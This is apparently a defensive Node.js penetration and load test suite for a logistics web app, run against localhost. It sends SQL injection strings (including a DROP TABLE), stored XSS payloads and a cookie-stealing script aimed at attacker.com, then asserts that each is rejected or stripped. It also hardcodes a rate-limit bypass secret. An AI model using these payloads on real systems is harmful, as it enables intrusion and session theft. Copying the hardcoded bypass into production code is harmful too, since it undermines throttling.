// Humo Logistics — Production Security Penetration & High-Load Stress Test Suite
// Verifies HTTP Security Headers, Payload Limits, SQL Injection Immunity, Stored XSS Stripping,
// IDOR / Authorization Security, Rate Limiter Throttling, and 100-Concurrent-Request Stress Stability.

import assert from 'node:assert';

const BASE_URL = 'http://localhost:3000';

async function runSecurityAndLoadTests() {
  console.log('================================================================');
  console.log('🛡️  STARTING HUMO LOGISTICS SECURITY & HIGH-LOAD PENETRATION SUITE');
  console.log('================================================================');

  // Helper for test bypass of rate limiter when executing non-rate-limit tests
  const TEST_BYPASS_HEADER = { 'x-test-bypass-rate-limit': 'humo_logistics_super_secret_key_2026' };

  // Ensure rate limits start completely clean
  await fetch(`${BASE_URL}/api/test/reset-rate-limits`, { method: 'POST' });

  // -------------------------------------------------------------
  // [1] Production Health Check & Security Headers
  // -------------------------------------------------------------
  console.log('\n[1] Testing Production Health Endpoint & HTTP Security Headers...');
  const healthRes = await fetch(`${BASE_URL}/api/health`);
  assert.strictEqual(healthRes.status, 200, 'Health endpoint must return 200 OK');
  const healthData = await healthRes.json();
  assert.strictEqual(healthData.status, 'ok');
  assert.ok(healthData.db === 'postgres' || healthData.db === 'sqlite', 'Database type must be postgres or sqlite');
  assert.ok(typeof healthData.uptime === 'number' && healthData.uptime >= 0, 'Uptime must be a valid number');
  console.log(`✓ Health endpoint verified: status=${healthData.status}, db=${healthData.db}, uptime=${healthData.uptime}s`);

  // Verify HTTP Security Headers
  const contentTypeOptions = healthRes.headers.get('x-content-type-options');
  const frameOptions = healthRes.headers.get('x-frame-options');
  const xssProtection = healthRes.headers.get('x-xss-protection');
  const referrerPolicy = healthRes.headers.get('referrer-policy');
  const poweredBy = healthRes.headers.get('x-powered-by');

  assert.strictEqual(contentTypeOptions, 'nosniff', 'X-Content-Type-Options must be nosniff');
  assert.strictEqual(frameOptions, 'DENY', 'X-Frame-Options must be DENY');
  assert.strictEqual(xssProtection, '1; mode=block', 'X-XSS-Protection must be 1; mode=block');
  assert.strictEqual(referrerPolicy, 'strict-origin-when-cross-origin', 'Referrer-Policy must be strict-origin-when-cross-origin');
  assert.strictEqual(poweredBy, null, 'X-Powered-By must be completely disabled');
  console.log('✓ All 5 HTTP Defense Headers strictly enforced (X-Powered-By removed).');

  // -------------------------------------------------------------
  // [2] Strict Payload Size Limits (100kb)
  // -------------------------------------------------------------
  console.log('\n[2] Testing Strict Payload Size Limits (100kb limit)...');
  const oversizedPayload = {
    padding: 'A'.repeat(120 * 1024) // 120 KB > 100 KB
  };
  const payloadRes = await fetch(`${BASE_URL}/api/listings`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      ...TEST_BYPASS_HEADER
    },
    body: JSON.stringify(oversizedPayload)
  });
  assert.strictEqual(payloadRes.status, 413, 'Oversized payload (>100kb) must be rejected with HTTP 413');
  const payloadData = await payloadRes.json();
  assert.strictEqual(payloadData.error, 'payload_too_large');
  console.log('✓ 120KB oversized payload blocked with 413 Payload Too Large.');

  // -------------------------------------------------------------
  // [3] SQL Injection Penetration Attacks
  // -------------------------------------------------------------
  console.log('\n[3] Testing SQL Injection Immunity on Auth, Search & Mutation...');

  // Attack 3A: Classic tautology login bypass
  const sqliLoginRes = await fetch(`${BASE_URL}/api/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...TEST_BYPASS_HEADER },
    body: JSON.stringify({
      email: "' OR '1'='1' --",
      password: "' OR '1'='1'"
    })
  });
  assert.ok(sqliLoginRes.status === 400 || sqliLoginRes.status === 401, 'SQLi login bypass must fail');
  console.log('✓ Tautology SQLi login bypass ("\' OR \'1\'=\'1\' --") safely rejected.');

  // Attack 3B: Admin user comment-out bypass
  const sqliAdminRes = await fetch(`${BASE_URL}/api/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...TEST_BYPASS_HEADER },
    body: JSON.stringify({
      email: "admin@humologistics.uz'--",
      password: "incorrect_password"
    })
  });
  assert.strictEqual(sqliAdminRes.status, 401, 'SQLi admin comment-out bypass must fail');
  console.log('✓ Admin account SQLi bypass ("admin@humologistics.uz\'--") safely rejected with 401.');

  // Attack 3C: Destructive DROP TABLE injection inside search query parameters
  const sqliSearchRes = await fetch(
    `${BASE_URL}/api/listings?origin_country='; DROP TABLE users; --&body_type=curtainsider' OR '1'='1`,
    { headers: TEST_BYPASS_HEADER }
  );
  assert.strictEqual(sqliSearchRes.status, 200, 'Search query with SQLi characters must safely execute as parameterized query');
  const sqliSearchData = await sqliSearchRes.json();
  assert.ok(Array.isArray(sqliSearchData.listings), 'Must return listings array');

  // Verify users table was NOT dropped and remains completely healthy
  const postSqliHealth = await fetch(`${BASE_URL}/api/health`);
  assert.strictEqual(postSqliHealth.status, 200, 'Database tables must remain intact after SQL injection attempts');
  console.log('✓ Destructive SQLi injection (\'; DROP TABLE users; --\') neutralized via parameterized queries.');

  // -------------------------------------------------------------
  // [4] Stored & Reflected XSS Sanitization Tests
  // -------------------------------------------------------------
  console.log('\n[4] Testing Input Sanitization against Stored XSS...');

  // Register clean test user
  const userTimestamp = Date.now();
  const testUserEmail = `sec_user_${userTimestamp}@example.com`;
  const regRes = await fetch(`${BASE_URL}/api/auth/register`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...TEST_BYPASS_HEADER },
    body: JSON.stringify({ email: testUserEmail, password: 'SecurePassword123!' })
  });
  assert.strictEqual(regRes.status, 201);
  const { token: userToken, user: testUser } = await regRes.json();

  // Complete profile
  await fetch(`${BASE_URL}/api/profile`, {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${userToken}`,
      ...TEST_BYPASS_HEADER
    },
    body: JSON.stringify({
      first_name: 'Security',
      last_name: 'Auditor',
      phone: '+998901112233',
      role: 'cargo_owner'
    })
  });

  // Attempt to publish cargo with embedded malicious script & HTML event handlers
  const maliciousCargoPayload = {
    origin_country: 'UZ',
    origin_locality: 'tashkent_city',
    destination_country: 'KZ',
    destination_locality: 'almaty',
    cargo_name: "<script>alert('MALICIOUS_XSS')</script>Heavy Machinery <img src=x onerror=alert('xss')>",
    cargo_description: "Valid description <iframe src='http://evil.com'></iframe><a href='javascript:alert(1)'>Click here</a>",
    weight: 18,
    body_type: 'curtainsider',
    loading_date_type: 'ready_now',
    price_type: 'negotiable'
  };

  const xssListingRes = await fetch(`${BASE_URL}/api/listings`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${userToken}`,
      ...TEST_BYPASS_HEADER
    },
    body: JSON.stringify(maliciousCargoPayload)
  });
  assert.strictEqual(xssListingRes.status, 201, 'Cargo should be created after automatic input sanitization');
  const xssListingData = await xssListingRes.json();
  const createdListingId = xssListingData.listing.id;

  // Retrieve the saved listing to verify stored XSS was sanitized
  const getListingRes = await fetch(`${BASE_URL}/api/listings/${createdListingId}`, {
    headers: {
      'Authorization': `Bearer ${userToken}`,
      ...TEST_BYPASS_HEADER
    }
  });
  assert.strictEqual(getListingRes.status, 200);
  const retrievedListing = (await getListingRes.json()).listing;

  // Assertions: All dangerous tags and event handlers must be completely absent
  assert.ok(!retrievedListing.cargo_name.includes('<script>'), 'cargo_name must not contain <script>');
  assert.ok(!retrievedListing.cargo_name.includes('</script>'), 'cargo_name must not contain </script>');
  assert.ok(!retrievedListing.cargo_name.includes('onerror='), 'cargo_name must not contain onerror=');
  assert.ok(!retrievedListing.cargo_name.includes('<img'), 'cargo_name must not contain <img');
  assert.ok(retrievedListing.cargo_name.includes('Heavy Machinery'), 'cargo_name must preserve safe alphanumeric text');

  assert.ok(!retrievedListing.cargo_description.includes('<iframe'), 'cargo_description must not contain <iframe');
  assert.ok(!retrievedListing.cargo_description.includes('javascript:'), 'cargo_description must not contain javascript:');
  console.log('✓ Stored XSS payload in listing stripped: script tags, iframes & DOM event handlers removed.');

  // Test Chat Message Sanitization
  // Register second user for chat
  const chatPartnerEmail = `sec_partner_${userTimestamp}@example.com`;
  const partnerRegRes = await fetch(`${BASE_URL}/api/auth/register`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...TEST_BYPASS_HEADER },
    body: JSON.stringify({ email: chatPartnerEmail, password: 'SecurePassword123!' })
  });
  const partnerToken = (await partnerRegRes.json()).token;

  await fetch(`${BASE_URL}/api/profile`, {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${partnerToken}`,
      ...TEST_BYPASS_HEADER
    },
    body: JSON.stringify({
      first_name: 'Driver',
      last_name: 'Tester',
      phone: '+998909998877',
      role: 'driver'
    })
  });

  // Start chat with malicious script message
  const chatStartRes = await fetch(`${BASE_URL}/api/chat/conversations`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${partnerToken}`,
      ...TEST_BYPASS_HEADER
    },
    body: JSON.stringify({
      listing_type: 'cargo',
      listing_id: createdListingId,
      message: "<script>window.location='http://attacker.com/steal?cookie='+document.cookie</script>Salom <b onmouseover=alert(1)>do'stim</b>"
    })
  });
  assert.strictEqual(chatStartRes.status, 201);
  const conversationId = (await chatStartRes.json()).conversation.id;

  // Retrieve conversation messages
  const convRes = await fetch(`${BASE_URL}/api/chat/conversations/${conversationId}/messages`, {
    headers: {
      'Authorization': `Bearer ${partnerToken}`,
      ...TEST_BYPASS_HEADER
    }
  });
  assert.strictEqual(convRes.status, 200);
  const convData = await convRes.json();
  const firstMsg = convData.messages[0];

  assert.ok(!firstMsg.content.includes('<script>'), 'Chat message must not contain <script>');
  assert.ok(!firstMsg.content.includes('onmouseover='), 'Chat message must not contain onmouseover=');
  assert.ok(!firstMsg.content.includes('attacker.com'), 'Chat message must strip external redirection payload');
  assert.ok(firstMsg.content.includes('Salom'), 'Chat message preserves safe human content');
  console.log('✓ Stored XSS payload in chat message stripped: cookie theft payload removed cleanly.');

  // -------------------------------------------------------------
  // [5] Authorization, IDOR & JWT Tampering Security
  // -------------------------------------------------------------
  console.log('\n[5] Testing Authorization, IDOR & Token Tampering Protection...');

  // IDOR 5A: Unauthenticated admin access
  const unauthAdminRes = await fetch(`${BASE_URL}/api/admin/stats`);
  assert.strictEqual(unauthAdminRes.status, 401, 'Unauthenticated access to /api/admin/stats must be rejected with 401');

  // IDOR 5B: Regular user accessing admin dashboard
  const userAdminRes = await fetch(`${BASE_URL}/api/admin/stats`, {
    headers: {
      'Authorization': `Bearer ${userToken}`,
      ...TEST_BYPASS_HEADER
    }
  });
  assert.strictEqual(userAdminRes.status, 403, 'Regular user accessing admin endpoint must be rejected with 403 Forbidden');
  console.log('✓ Admin dashboard protected: 401 for unauthenticated, 403 for non-admin.');

  // IDOR 5C: User 2 attempting to tamper with / edit User 1's listing
  const unauthorizedEditRes = await fetch(`${BASE_URL}/api/listings/${createdListingId}`, {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${partnerToken}`,
      ...TEST_BYPASS_HEADER
    },
    body: JSON.stringify({
      origin_country: 'UZ',
      origin_locality: 'tashkent_city',
      destination_country: 'KZ',
      destination_locality: 'almaty',
      cargo_name: 'Hacked Cargo Name',
      weight: 10,
      body_type: 'curtainsider',
      loading_date_type: 'ready_now',
      price_type: 'negotiable'
    })
  });
  assert.strictEqual(unauthorizedEditRes.status, 403, 'Cross-user edit attempt must be rejected with 403 Forbidden');

  // Also test unauthorized status close attempt
  const unauthorizedStatusRes = await fetch(`${BASE_URL}/api/listings/${createdListingId}/status`, {
    method: 'PATCH',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${partnerToken}`,
      ...TEST_BYPASS_HEADER
    },
    body: JSON.stringify({ status: 'closed' })
  });
  assert.strictEqual(unauthorizedStatusRes.status, 403, 'Cross-user status modification must be rejected with 403 Forbidden');
  console.log('✓ IDOR mutation attack blocked: unauthorized edit and status closure rejected with 403 Forbidden.');

  // IDOR 5D: User 3 attempting to read User 1 & 2's private chat
  const thirdUserReg = await fetch(`${BASE_URL}/api/auth/register`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...TEST_BYPASS_HEADER },
    body: JSON.stringify({ email: `intruder_${userTimestamp}@example.com`, password: 'Password123!' })
  });
  const intruderToken = (await thirdUserReg.json()).token;

  const eavesdropRes = await fetch(`${BASE_URL}/api/chat/conversations/${conversationId}/messages`, {
    headers: {
      'Authorization': `Bearer ${intruderToken}`,
      ...TEST_BYPASS_HEADER
    }
  });
  assert.strictEqual(eavesdropRes.status, 403, 'Third party attempting to eavesdrop on private conversation must get 403');
  console.log('✓ IDOR conversation privacy enforced: third-party eavesdropping rejected with 403 Forbidden.');

  // 5E: Forged / Tampered JWT Token
  const forgedTokenRes = await fetch(`${BASE_URL}/api/profile`, {
    headers: {
      'Authorization': 'Bearer forged.token.signature.attack',
      ...TEST_BYPASS_HEADER
    }
  });
  assert.strictEqual(forgedTokenRes.status, 401, 'Forged JWT token must be rejected with 401 Unauthorized');
  console.log('✓ Forged token rejected with 401.');

  // -------------------------------------------------------------
  // [6] Rate Limiting & Brute-Force Flood Simulation
  // -------------------------------------------------------------
  console.log('\n[6] Testing Rate Limiting & Flood Simulation (Auth Endpoint: max 10 requests)...');

  // Reset rate limits to ensure clean state
  await fetch(`${BASE_URL}/api/test/reset-rate-limits`, { method: 'POST' });

  // Rapidly fire 12 login attempts from the same IP (without bypass header)
  const authFloodResults = [];
  for (let i = 1; i <= 12; i++) {
    const res = await fetch(`${BASE_URL}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: `flood_target_${i}@example.com`,
        password: 'wrong_password'
      })
    });
    authFloodResults.push({ index: i, status: res.status, headers: res.headers });
  }

  // The first 10 requests should be evaluated normally (returns 401 for invalid credentials)
  const first10 = authFloodResults.slice(0, 10);
  assert.ok(first10.every(r => r.status === 401), 'First 10 attempts should be processed and return 401');

  // The 11th and 12th requests must be throttled with 429 Too Many Requests
  const throttled = authFloodResults.slice(10);
  assert.ok(throttled.length >= 2, 'Must have at least 2 throttled requests');
  assert.strictEqual(throttled[0].status, 429, '11th attempt must trigger 429 Too Many Requests');
  assert.strictEqual(throttled[1].status, 429, '12th attempt must trigger 429 Too Many Requests');

  const retryAfter = throttled[0].headers.get('retry-after');
  assert.ok(retryAfter, '429 response must provide Retry-After header');
  console.log(`✓ Rate limiter successfully triggered 429 Too Many Requests after 10 attempts (Retry-After: ${retryAfter}s).`);

  // Reset rate limits before concurrent load test
  await fetch(`${BASE_URL}/api/test/reset-rate-limits`, { method: 'POST' });

  // -------------------------------------------------------------
  // [7] High-Load Concurrent Stress Test (100 Simultaneous Requests)
  // -------------------------------------------------------------
  console.log('\n[7] Running High-Load Concurrent Stress Test (100 Simultaneous Requests)...');
  console.log('    Spawning 50 concurrent GET /api/listings + 50 concurrent GET /api/transports...');

  const startTime = Date.now();
  const totalConcurrent = 100;
  const requests = [];

  for (let i = 0; i < totalConcurrent; i++) {
    const endpoint = i % 2 === 0 ? '/api/listings' : '/api/transports';
    const reqPromise = (async (index) => {
      const reqStart = Date.now();
      const res = await fetch(`${BASE_URL}${endpoint}`, {
        headers: TEST_BYPASS_HEADER
      });
      const reqDuration = Date.now() - reqStart;
      return {
        index,
        endpoint,
        status: res.status,
        duration: reqDuration
      };
    })(i);
    requests.push(reqPromise);
  }

  const results = await Promise.all(requests);
  const totalDuration = Date.now() - startTime;

  // Verify all 100 requests completed successfully with 200 OK
  const successful = results.filter(r => r.status === 200);
  assert.strictEqual(successful.length, totalConcurrent, `All ${totalConcurrent} concurrent requests must return 200 OK`);

  const latencies = results.map(r => r.duration);
  const minLatency = Math.min(...latencies);
  const maxLatency = Math.max(...latencies);
  const avgLatency = Math.round(latencies.reduce((sum, val) => sum + val, 0) / latencies.length);

  console.log(`✓ 100/100 concurrent requests succeeded (100% success rate).`);
  console.log(`  - Total Batch Duration: ${totalDuration} ms`);
  console.log(`  - Average Request Latency: ${avgLatency} ms`);
  console.log(`  - Min Latency: ${minLatency} ms | Max Latency: ${maxLatency} ms`);

  // Verify server health and DB pool stability immediately after the load surge
  const postLoadHealth = await fetch(`${BASE_URL}/api/health`);
  assert.strictEqual(postLoadHealth.status, 200);
  const postLoadData = await postLoadHealth.json();
  assert.strictEqual(postLoadData.status, 'ok');
  console.log(`✓ Server and database connection pool verified 100% healthy post-stress.`);

  console.log('\n================================================================');
  console.log('🎉 ALL SECURITY PENETRATION & HIGH-LOAD CHECKS PASSED PERFECTLY!');
  console.log('================================================================');
}

runSecurityAndLoadTests().catch(err => {
  console.error('\n❌ Security & Load Test Failure:', err);
  process.exit(1);
});
